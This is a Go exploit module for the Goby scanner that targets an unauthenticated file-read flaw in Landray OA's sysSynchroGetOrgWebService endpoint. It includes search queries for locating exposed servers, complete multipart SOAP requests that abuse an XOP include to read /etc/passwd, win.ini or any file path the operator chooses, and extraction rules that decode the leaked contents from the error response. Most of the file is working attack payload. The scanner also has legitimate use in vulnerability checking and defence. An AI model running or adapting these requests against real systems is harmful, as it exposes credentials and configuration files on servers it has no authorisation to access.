package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Landray OA /sys/webservice/sysSynchroGetOrgWebService File Read Vulnerability",
    "Description": "<p>Landray-OA, developed by Shenzhen Lanling Software Co., Ltd., is a mobile intelligent office product designed for small and medium-sized enterprises. It integrates DingTalk's digital capabilities with Lanling's years of experience in OA products and services, fully meeting the needs of enterprises for online daily office operations, corporate culture management, customer management, human resource services, and administrative services.</p>",
    "Product": "Landray-OA",
    "Homepage": "http://www.landray.com.cn/",
    "DisclosureDate": "2024-12-14",
    "PostTime": "2024-12-23",
    "Author": "chenyongqiang@baimaohui.net",
    "FofaQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "GobyQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "Level": "1",
    "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to read critical system files (such as database configuration files and system configuration files), resulting in the website being in an extremely insecure state.</p>",
    "Recommendation": "<p>1.Configure access policies using security devices such as firewalls, and set up a whitelist for access. </p><p>2.If not necessary, prohibit public internet access to the system.</p>",
    "References": [
        "https://mp.weixin.qq.com/s/9xcoXmoJb8GJnID4D2Wa-g"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "windows,linux,custom",
            "show": ""
        },
        {
            "name": "linux",
            "type": "textarea",
            "value": "/etc/passwd",
            "show": "attackType=linux"
        },
        {
            "name": "windows",
            "type": "textarea",
            "value": "c:/windows/win.ini",
            "show": "attackType=windows"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysSynchroGetOrgWebService",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Content-Type": "multipart/related; boundary=asasoxmmdmlnvlx08yluof5q"
                },
                "data_type": "text",
                "data": "--asasoxmmdmlnvlx08yluof5q\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://out.webservice.organization.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getOrgStaffingLevelInfo>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///etc/passwd\"/></count>\r\n        </arg0>\r\n    </web:getOrgStaffingLevelInfo>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n--asasoxmmdmlnvlx08yluof5q--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "cm9vdDp",
                        "bz": "root:"
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysSynchroGetOrgWebService",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Content-Type": "multipart/related; boundary=asasoxmmdmlnvlx08yluof5q"
                },
                "data_type": "text",
                "data": "--asasoxmmdmlnvlx08yluof5q\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://out.webservice.organization.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getOrgStaffingLevelInfo>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///C:/Windows/win.ini\"/></count>\r\n        </arg0>\r\n    </web:getOrgStaffingLevelInfo>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n--asasoxmmdmlnvlx08yluof5q--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "OyBmb3IgM",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysSynchroGetOrgWebService",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Content-Type": "multipart/related; boundary=asasoxmmdmlnvlx08yluof5q"
                },
                "data_type": "text",
                "data": "--asasoxmmdmlnvlx08yluof5q\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://out.webservice.organization.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getOrgStaffingLevelInfo>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///{{{filePath}}}\"/></count>\r\n        </arg0>\r\n    </web:getOrgStaffingLevelInfo>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n--asasoxmmdmlnvlx08yluof5q--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "temp|lastbody|regex|Unmarshalling Error: Not a number:\\s*(.+?)\\s*</faultstring>",
                "output|temp|base64_decode|temp"
            ]
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/sysSynchroGetOrgWebService",
                "follow_redirect": true,
                "header": {
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
                    "Content-Type": "multipart/related; boundary=asasoxmmdmlnvlx08yluof5q"
                },
                "data_type": "text",
                "data": "--asasoxmmdmlnvlx08yluof5q\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://out.webservice.organization.sys.kmss.landray.com/\">\r\n<soapenv:Header/>\r\n<soapenv:Body>\r\n    <web:getOrgStaffingLevelInfo>\r\n        <arg0>\r\n            <beginTimeStamp>a</beginTimeStamp>\r\n            <count><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///{{{filePath}}}\"/></count>\r\n        </arg0>\r\n    </web:getOrgStaffingLevelInfo>\r\n</soapenv:Body>\r\n</soapenv:Envelope>\r\n--asasoxmmdmlnvlx08yluof5q--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "temp|lastbody|regex|Unmarshalling Error: Not a number:\\s*(.+?)\\s*</faultstring>",
                "output|temp|base64_decode|temp"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA /sys/webservice/sysSynchroGetOrgWebService 文件读取漏洞",
            "Product": "Landray-OA系统",
            "Description": "<p>蓝凌OA是由深圳市蓝凌软件股份有限公司开发，是一款针对中小企业的移动化智能办公产品 ，融合了钉钉数字化能力与蓝凌多年OA产品与服务经验，能全面满足企业日常办公在线、企业文化在线、客户管理在线、人事服务在线、行政务服务在线等需求。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Landray OA /sys/webservice/sysSynchroGetOrgWebService File Read Vulnerability",
            "Product": "Landray-OA",
            "Description": "<p>Landray-OA, developed by Shenzhen Lanling Software Co., Ltd., is a mobile intelligent office product designed for small and medium-sized enterprises. It integrates DingTalk's digital capabilities with Lanling's years of experience in OA products and services, fully meeting the needs of enterprises for online daily office operations, corporate culture management, customer management, human resource services, and administrative services.<br></p>",
            "Recommendation": "<p>1.Configure access policies using security devices such as firewalls, and set up a whitelist for access.&nbsp;</p><p>2.If not necessary, prohibit public internet access to the system.<br></p>",
            "Impact": "<p>Unauthenticated attackers can exploit this vulnerability to read critical system files (such as database configuration files and system configuration files), resulting in the website being in an extremely insecure state.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{linux}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/sys/webservice/sysSynchroGetOrgWebService"
    },
    "PocId": "9980"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}